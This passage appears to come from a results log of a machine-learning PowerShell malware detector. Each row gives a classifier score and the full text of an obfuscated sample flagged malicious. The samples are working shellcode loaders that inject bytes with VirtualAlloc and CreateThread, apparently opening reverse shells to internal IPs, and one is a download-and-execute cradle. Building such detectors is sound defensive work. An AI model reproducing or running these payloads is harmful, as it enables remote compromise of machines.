{M7HwinF','r lp','3,0x57,0x68,0x02,0xd9,0xc8,','52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0',',0x7d,0xf','32','ublic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(CH7kernel32.dllCH7)]public static extern IntPtr CreateThread(IntPt','a,0x00,','58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x','e -Name CH7Win32CH7 -namespace Win32','xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0','3c,0','8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x','0xe0,0x75,0xf4,0x03',',0xc3,0x29,0','8b,0x01,0xd6,0x','x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6','H7kernel32.dllCH7)]p','xc6,0x85','24,0','x4e,0x08,0x75,0xec,0x68,0','Functions -passthru;[Byte[]];[Byte[]]M7Hsc64 = 0xfc,0x','ep 60 };',',0x38,','M7Hcode = vNr[DllImport(C','e','50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x0a,0xe5,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0','xff,0x31,0xc0,0xac,0x','ff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,',', IntPtr lpThreadId);[DllImport(CH7msvcrt.dllCH7)]public static extern IntPtr memset(In')).replace('CH7',[STRing][CHar]34).replace('vNr',[STRing][CHar]39).replace(([CHar]77+[CHar]55+[CHar]72),[STRing][CHar]36) | . ( $VeRbOseprEfERENcE.tOstriNg()[1,3]+'x'-jOiN'')",malicious,TP
2026-07-13 17:00:03,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\242.ps1,custom-ps-ml,UNKNOWN,28485eb8-6caf-4dc8-9a02-35302cb78737,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2791,1478.62," (((\""{41}{29}{17}{13}{46}{9}{11}{22}{25}{3}{18}{30}{27}{19}{23}{43}{36}{20}{1}{10}{38}{31}{14}{2}{28}{33}{12}{6}{8}{44}{16}{24}{45}{0}{32}{42}{26}{7}{39}{4}{5}{35}{21}{15}{37}{40}{34}\""-f',0x10,0x56,0x57,0x6','xc1,0xcf,0x0d,0x01,','8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b','nt count);','f,0xd5',',0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;4Krg = 0x1000;if (4Krz.Length -gt 0x1000){4Krg = 4Krz.Length}','xc4,0x54,0x','x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x5','50,','t dwStackSize,','0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,',' IntPtr lpStartAddress,','f,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0','ionType, uint flProtect);[DllImp','b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x',' (4Kri=0;4Kri -le (4Krz.Len','x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97',' uint flAllocat','d1Z;4Krw = Add-Type -memberDefinit','e8,0x8',',0x2c,0x20,0','loc(0,0x1000,4Krg,0x40);for',' IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(PMQmsvcrt.dllPMQ)]public static extern IntPtr memset(IntPtr dest, ','9,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14',',0x6a,0x05,0x68,0xc0','uint src, ui','0',' Win32Functions -passthru;[Byte[]];[Byte[]]4Krz = 0xfc,0x',',0x12,0xeb,0x86,0x5d,0x68,0x33,0','Import(PMQkernel32.dllPMQ)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,','ion 4Krc -Name PMQWin32PMQ -namespace','0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3','8,0x99,0xa5,0x74,0x61,0xff,0','x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xf','-sleep 60};',';4Krx=4Krw::VirtualAl','0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02','gth-1);4Kri++) {4Krw::memset([IntPtr](4Krx.ToInt3','0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,','6,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xf','2()+4Kri), 4Krz[4Kri], 1)};4Krw::CreateThread(0,0,4Krx,0,0,0);for (;;){Start','4Krc = d1Z[Dll','xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,',',0x8b,0x72,','0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0',',0xa8,0x96,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a','ort(PMQkernel32.dllPMQ)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uin')) -cREPLAcE  'PMQ',[CHaR]34-cREPLAcE ([CHaR]52+[CHaR]75+[CHaR]114),[CHaR]36 -cREPLAcE([CHaR]100+[CHaR]49+[CHaR]90),[CHaR]39)|. ((VAriablE '*mDR*').nAmE[3,11,2]-JOiN'')",malicious,TP
2026-07-13 17:00:08,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2431.ps1,custom-ps-ml,UNKNOWN,4fd06b5d-97ea-4b34-aac8-0fa4a5b4c65c,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,1722,1578.28,"(((\""{19}{108}{127}{106}{121}{37}{2}{67}{46}{20}{58}{124}{122}{80}{89}{11}{27}{49}{97}{3}{34}{111}{54}{88}{95}{36}{113}{78}{74}{81}{48}{77}{75}{119}{47}{70}{13}{76}{68}{83}{118}{21}{4}{60}{107}{35}{84}{92}{26}{79}{86}{50}{105}{117}{18}{32}{82}{85}{30}{7}{33}{62}{66}{93}{41}{17}{100}{10}{24}{90}{96}{69}{40}{87}{45}{101}{65}{8}{0}{28}{61}{6}{31}{120}{91}{22}{104}{102}{109}{112}{115}{1}{110}{63}{94}{128}{25}{123}{39}{64}{59}{52}{51}{99}{44}{15}{16}{53}{116}{57}{23}{114}{126}{29}{56}{125}{73}{55}{42}{38}{103}{5}{14}{12}{71}{72}{98}{43}{9}\"" -f ':DeFaULTW','AchE]:','M','CLi','Poi','2_',';e','.HeaD',']:','-jOinoLNoLN)','Z2u);eZ2WC.PrOxY = [SY',' SYsTEm','[e',';','-bXoreZ2K',';','eZ2i=0;[','oLN',' {eZ2','[S',' ','ystem.Net.Service','I','b=([chaR[]](eZ2','sTEm.','DENTI','er','.N','eb','wNlOa','Z2wc','Z2','t','Ers.Ad','ent;eZ2',':S','0 (Windo','t','7/index.aspWwh)))MU',';e','BRE','-Agent','8','IEX (eZ2b','LN','U','Ct100ConTiNUe','.',' WOW64; Tri','Et.WE','ali','e2d45da8a51','7e0a','chaR[]]e','M','197:80','dSTRIng(Wwhhttps:','2','= ','K=oLN6df0e78d1','n','PrOXy','D','D','Z2','T','(oLN','ANAGer]::EXpE',') li','.We','0','Z2I++%eZ2k.','L','42.','1','ent/',' rv:11.0','d','s NT 6.','Certi','OBj',';','rue','ke Geck','er','};e','ficateV','q','ozilla','EcT','N','Y.CrEdENt','v','User','EFaul','/5.','eT','b','eNGTH]};','2a3f858ao',',e','Es','S ','L%{eZ','al','dationC','m.NeT.ServICEPo','tManager]:','Y','=',':','u=oLN',' [SYs','w','Wc.','tEM.NET.CredeNTIalC','Z','allback =','ooLN;[S','7','wc.PrOX','in','-','aLS','0;eZ2Wc=NEW','//10.130.1','Do','sTe','tNetWOrkCre'))-REPlace 'eZ2',[CHar]36-CrePlACe  'Wwh',[CHar]34-CrePlACe'oLN',[CHar]39-CrePlACe'MUL',[CHar]124) | &amp; ( ([stRInG]$vErBOSepreFeRENCE)[1,3]+'X'-JOiN'')",malicious,TP
2026-07-13 17:00:10,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2434.ps1,custom-ps-ml,UNKNOWN,ce106bc6-9c09-4224-b902-8fea3b02f18e,DESKTOP-BAC9DBQ,malicious,0.9941,RandomForest,2843,1485.06," &amp; ( $SHellId[1]+$SHElLiD[13]+'X') ((((\""{30}{11}{1}{28}{7}{36}{9}{35}{8}{6}{15}{41}{21}{34}{12}{33}{18}{45}{29}{19}{42}{47}{24}{26}{37}{38}{44}{5}{46}{3}{25}{10}{0}{23}{13}{2}{39}{27}{40}{43}{4}{17}{22}{16}{14}{32}{20}{31}\"" -f'4,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50','t',',0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x1','0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,','x56,0x6a','0x32,0x00,0x00,0x68,0x77,0x73,0x32,0','tributes, uint dwStackSize, IntPtr lpStartAddress,','tPtr VirtualAlloc(IntP','eateThread(IntPtr lpThreadAt',' flAllocationType, uint flProte',',0x00,0x00,0x29,0xc4,0x5','tatic ex','[Byte[]];[By','0x56,0x57,0x68,0x99,0xa5,0x74,0x61','e',' IntPtr lpParameter, uint d',':VirtualAlloc(0,0x1000,JvMg,0x40);for (JvMi=0;JvMi -le (JvMz.Length-1);JvMi++) {JvMw::memset([IntPtr](JvMx.ToInt32()+JvMi), JvMz[JvMi], 1)};JvMw::Creat',',0x00,0x53,0xff,0xd5;JvMg = 0x1000;if (JvMz.Length -gt 0x1000){JvMg = JvMz.Length}','82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,','0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b',';',';98h;JvMw = Add-Type -memberDefinition JvMc -Name lo7Win32lo7',';JvMx=JvMw:',',0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x10,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,','xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b','0x01',',0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x',',0xe5,0xff,0xd5,0x93,0x53,0x6','ern In','x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,','JvMc = 98h[DllImport(lo7kernel32.dlllo7)]public s',';){Start-sleep 60};','Thread(0,0,JvMx,0,0,0);for (','te[]]JvMz = 0xfc,0xe8,0x',' -namespace Win32Functions -passthru;','ct);[DllImport(lo7kernel32.dlllo7)]public static extern IntPtr Cr','tr lpAddress, uint dwSize, uint','24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xf','f,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb','0,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53','a,0x00,0x56,0x53,0x57,0x68,0x02,0','wCreationFlags, IntPtr lpThreadId);[DllImport(lo7msvcrt.dlllo7)]public static extern IntPtr memset(IntPtr dest, uint src, uint count)',',0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b','xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0',',0x8d,0x5d,0x68,0x33,','0xff,0xac,0','x5f,',',0x34,0x8b,0x01,0xd6,0x31,0')) -crEpLACe 'JvM',[CHAr]36 -rEPLaCe ([CHAr]108+[CHAr]111+[CHAr]55),[CHAr]34  -rEPLaCe ([CHAr]57+[CHAr]56+[CHAr]104),[CHAr]39) )",malicious,TP
2026-07-13 17:00:12,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2437.ps1,custom-ps-ml,UNKNOWN,d8026cf4-8f05-4576-b7d6-4a7833ce26b8,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3539,1490.73," (((\""{26}{81}{39}{71}{9}{51}{48}{40}{73}{37}{38}{11}{55}{2}{35}{67}{46}{12}{56}{0}{8}{45}{75}{61}{24}{72}{43}{18}{62}{14}{74}{49}{76}{36}{52}{32}{31}{30}{6}{33}{64}{4}{28}{41}{58}{25}{3}{15}{50}{80}{34}{22}{59}{53}{47}{77}{79}{21}{68}{29}{42}{70}{69}{54}{44}{1}{84}{65}{23}{13}{10}{66}{60}{82}{20}{57}{78}{7}{16}{83}{5}{17}{63}{27}{19}\""-f'a,0x31,0x6b,0x',',0xdc,0x5e,0x2b,0x45,0x69,0x7c,0xb4,0xbc,0xef,0x41,0x3f,0xf3,0x7b,0x46,0xc1,0xc8,','n322pG','4e,0x35,0','de,0x8a,0xd1,0xfd,0x78,0x77,0xe3,0xd2,0x1f,0xfc,0xef,0x9f,0x54,0x5a,0xec,0x1e,0xb8,0xd0,0x08,0xab,0x3f,0x37,0x99,0xef,0x1b,0x93,0xc1,0xb4,0x02,0x82,0xaf,0x1b,0x3a,0xd4,0x0f,0xc4,0x9e,0x9e,0xa2,0x11,0x93,0xfc,0xaa,0x8b,0xc9,0x8a,0x2a,0x3b,0x65,0x1a,0x4','IntPtr](xTFuRm5.ToInt','2,0x30,0xe5,0x3a,0xb2,0xf7,0x15','for (xTFi','14,0x83,0xeb,','t dwSize, uin','46,0x65,0x94,0x','rn IntPtr memset(IntPtr dest, uint src, uint count);8Mq;xTFw = Add-Type -memberDefinit','te[]]',',0xd2,0xca,0xe5,0x10,0x','3,0xeb,0x6d,0xb3,0xe','x97,0xb6,','=0;xT','32()+x','x7a,0x0b,0x03,0xf7,0x9f','teThread(0,0,xTFuRm5,0,0,0);for (;;){Start-sleep 60};',',0x31,0x12,0x6c,0xea;xTFg = 0x1000;if (xTFz.Length -gt 0x1000){xTFg = xTFz.Length};xTFuRm5=xTFw::Virtu','f9,0xb3,0x11,0xd8,0x57,0x5b,','0x78,0x96,0x7e,0x45,0x78,0x96,0','7,0xbb,0xe1,0xb4,0x3b,0x21,0x7c,0xbe','2,0x81,0xc',',0x','xTFYQ','Fw::Crea','5,0xd2,0xdd,0xb4,0xd5,0x53,0xf','xc9,0x','f,0xe9,0xe0,0x47,0x3e,0xd8,0xb6,0xdc,0x19,0xfa,0x39,0x30,0x12,0xb3,0x21,0x55,0x1e,0x0d,0xd9,0xad,0xd5,0x8c,0x0b,0xfc,0x16,0x22,0x7','c,0xae,0x68,0xf3,0x8e,0x3','0xfd,0x47,0xb7,0xd2,0x50,0x78,0xb',',0x49,0','0x74,0x6a,0xab,0xb3,0x2c,0xf5,0x8c,0x3b,0x05,0x56,0x81,0xa9,0xa5,0x0a,0x76,0x46,0x46,0xb0,',' -na','3,0x96,0x67,','ern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntP','tr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(2pGmsvcrt.dll2pG)]public static exte','l2pG)]public static extern IntPtr Virtual','l2pG)]public static','8,0x4','1d,0xa4,0xf8,0xa5,0x72','63,0x7d,0','e,0x1b,0x55,0x7d,0xda,0xc8,0x40,0x82,0xf7,0x7c,0xd9,0x2e,0x7e,0x65,0x89,0xb8,0x80,0x4a,0x36,0x39,0xd3','0xfc,0x','nctions -passthru;[By',',0x9f,0xa1,0','l32.dl',',0','0x23,','t flAllocationType, uint flProtect);[DllImport(2pGkerne','0x0c,0x15,0xde,0x95,','x96,0xa6,0x47',',0xe5,0x7e,0x48,0x3d,0xa5,0x7','ion xTFYQgc -Name 2pGWi',';[Byte[]]xTFz = 0xbd,0xff,0x87,0x7d,0x22,0xd9,0xc0,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xb1,0x5','a','3,0x19','x7e,0x79,0x4a,0xae,0x4c,0xfc,0xed,0xce,0xe0,0','x10,0x75,0x','x1d,0x7',',0x3a,0x03,0x6','TFi), xTFz[xTFi], 1)};xT','xca,0x0b,0xa8,0x4a,0x09,0x71,0x76,0x','0x32,0x69,0x64,0xa','03,0xe5,0','mespace Win32Fu','0x93,0xa0,0','0,0x82,0x94,0xa7,0xbc,0x14,0x16,0x28,0x3d',',0x08,0x50,0x1c,0x1c,0x83,0x50,0xb8,0xa7,0x24,0x89,0x3d,0x97,0xae,0x38,0x71,0x62,0x88,0x55,0x7d,0x39,0x88,0xf','Alloc(IntPtr lpAddress, uin','a,0x',' ext','7,0xb9,0x81,0x38,0xa5,0x29,0x11,0x4c,0x62,0x5d,0x92,0xfa','03,0x6b,0x10,0','x54,0x50,0x23,0x56,0xa4,0xf3,0xa7,0xa4,0xf9,0xd','xb7,0x8d,0x29,0xeb,0x14,0x46,0x2a,0xc6,0x7a,0x12,0x79,0x75,0x29,0x4c,0x2d,0x2f','lAlloc(0,0x1000,xTFg,0x40);',',0xa5,0x99,0x84,0xe1,0x0e,0xa1,0xf2,0x68,0x1a,0x57,0xa2,0xfc,0x5a,0x54,0x5c,0xfd,0xd3,0x7b,0x36,0x','0x65,','gc = 8Mq[DllImport(2pGkernel32.dl','ae,0x85,0xf4,0xe1','Fi -le (xTFz.Length-1);xTFi++) {xTFw::memset([','0xf9,0x89,0xb4,0x2b,0x59,0xc9,0x68,0x5b,0x2f,'))  -crEplACe  ([cHAR]120+[cHAR]84+[cHAR]70),[cHAR]36 -REplACE  '2pG',[cHAR]34-REplACE([cHAR]56+[cHAR]77+[cHAR]113),[cHAR]39) | .( $SHeLLiD[1]+$sHELliD[13]+'X')",malicious,TP
2026-07-13 17:00:17,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2457.ps1,custom-ps-ml,UNKNOWN,40f6c26c-708c-4567-886d-aa17b72c7e34,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2806,1477.43,"((\""{5}{18}{34}{31}{35}{20}{23}{44}{41}{37}{17}{36}{13}{42}{32}{9}{3}{39}{1}{0}{6}{14}{21}{33}{25}{2}{16}{10}{4}{29}{26}{30}{12}{27}{45}{11}{22}{38}{15}{40}{8}{43}{7}{28}{46}{24}{19}\"" -f '0xcf,0x0d,0x',',0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,','x31,0xff,0x31,0xc0,0x','x52,','8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x','MGLlw8 = Q7W[DllImport(LAZkernel32.dllLAZ)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, ','01,0xc7,0','00){MGLg = MGLz.Length};MGLsT7U=M','xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;MGLg = 0x1000;if (MGLz.Len','2,0x0c,0x8b,0','c,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x',',0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0',',0x50,0x50,0x50,0','0xe8,0x89,0x00,0x','xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0','6,0x6a,0x00,0x68,0x58,','a','[]];[B','uint dwSize, uint fl','GLsT7U,0,0,0);for (;;){Start-sleep 60};',' IntPtr lpParameter, uint dwCreation','x0',',0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04','Flags, IntPtr lpThreadId)','mset([IntPtr](MGLsT7U.ToInt32()+MGLi), MGLz[MGLi], 1)};MGLw::CreateThread(0,0,M','1,0xd6,0','4,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4','x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x03,0x68','GLw::VirtualAlloc(0,0x1000,MGLg,0x40);for (MGLi=0;MGLi -le (MGLz.Length-1);MGLi++) {MGLw::m','2','c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5','t);[DllImport(LAZkernel32.dllLAZ)]public static extern IntPtr CreateThread(','0x5','1,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x0','AllocationType, uint flProtec','IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,','yte[]]MGLz = 0xfc,','AZWin32LAZ -namespace Win32Functions -passthru;[Byte',',0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x5','0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a','0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0','est, uint src, uint count);Q7W;MGLw = Add-Type -memberDefinition MGLlw8 -Name L','00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,','gth -gt 0x10',';[DllImport(LAZmsvcrt.dllLAZ)]public static extern IntPtr memset(IntPtr d',',0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a','e')).rePLaCe('MGL',[stRing][cHaR]36).rePLaCe('Q7W',[stRing][cHaR]39).rePLaCe(([cHaR]76+[cHaR]65+[cHaR]90),[stRing][cHaR]34) | . ((GeT-variablE '*mDr*').nAMe[3,11,2]-join'')",malicious,TP
2026-07-13 17:00:29,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2469.ps1,custom-ps-ml,UNKNOWN,90f1b11b-e93e-440b-ae17-5131547b95f9,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2989,1531.06,"((\""{32}{13}{5}{59}{51}{33}{63}{52}{20}{30}{38}{35}{24}{39}{70}{21}{4}{23}{68}{31}{8}{17}{6}{9}{42}{54}{18}{26}{69}{36}{50}{56}{25}{27}{15}{3}{12}{60}{67}{7}{1}{34}{2}{14}{46}{61}{48}{43}{44}{53}{55}{10}{47}{29}{58}{37}{11}{62}{45}{16}{41}{22}{65}{49}{0}{64}{40}{66}{19}{28}{57}\"" -f'53,0xff,0xd5;Jo','8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0',',0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,',',0x78','Ptr lpThreadId);[DllImport(W4Lmsvcrt.dl','32.dllW4L','in32W4L -namespace Win3','x51,0x','uint co','2','04,0x59,0xd5,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6','x68,0x00,0x10',',0x','4Lkernel','0x7d,0xf8','0,0x8b,0x4a,0x3c,0x8b,0x4c,0x11',',0x57,0x68,0x02,0xd9,0xc8,0x5f,0xf','unt);xHR;JoUw = Add-Type -memberDefinition JoUc -Name W4LW',']];[Byte[]]JoUz = 0xf',' (JoUz.Length-','Import','t','0x00,0x7e,0xc3,0','lW4L)]public sta','t dwStackSize, IntPtr lpStartAddress, IntPtr','0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01','c,0xe8,0x82,0x00,0x',',0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x1','1);JoUi++) {JoUw::memset([IntPtr](JoUx.',',0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00','(W4Lkernel32.dllW4L)]public static ext','emset(IntPtr dest, uint src, ','JoUc = xHR[DllImport(W',' lpAddress, uint dw','xe3,0x3a,0x49,0x8b,0x34,0x8b','tr lpThreadAttributes, uin','0c','7e,0xe9,0x8b,0x36,0x6a,0x40,0','ern IntPtr CreateThread(IntP',' lpParameter, uint dwCreat','gth -gt 0x1000){JoUg = JoUz.Length};JoUx=JoUw::VirtualAlloc(0,0x1000,JoUg,0x40)','f,0xd5,0x83,0xf8,','Func','8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f',',0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x0','4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53',',0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x','a','xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x','0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x',',0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c','atic extern IntPtr VirtualAlloc(IntPtr','t flAllocationType, uint flProtect);[Dll','1,0x00,0x00,0','tions -passthru;[Byte[','x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb3,0x',',','ToInt32()+JoUi), JoUz[JoUi], 1)};JoUw::CreateThread(0,0,JoUx,0,0,0);for (;;){Start-sleep 60};',',0x',')]public st','e3,0x','8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0',',0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa','Size, uin','Ug = 0x1000;if (JoUz.Len','x01,0xc3,0x29,0xc6,',';for (JoUi=0;JoUi -le','48,0x01,0xd1,0','tic extern IntPtr m','00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x','ionFlags, In')).REPlAce('JoU',[STrING][cHAr]36).REPlAce(([cHAr]87+[cHAr]52+[cHAr]76),[STrING][cHAr]34).REPlAce('xHR',[STrING][cHAr]39)|.( $SHELLiD[1]+$SHeLlid[13]+'x')",malicious,TP
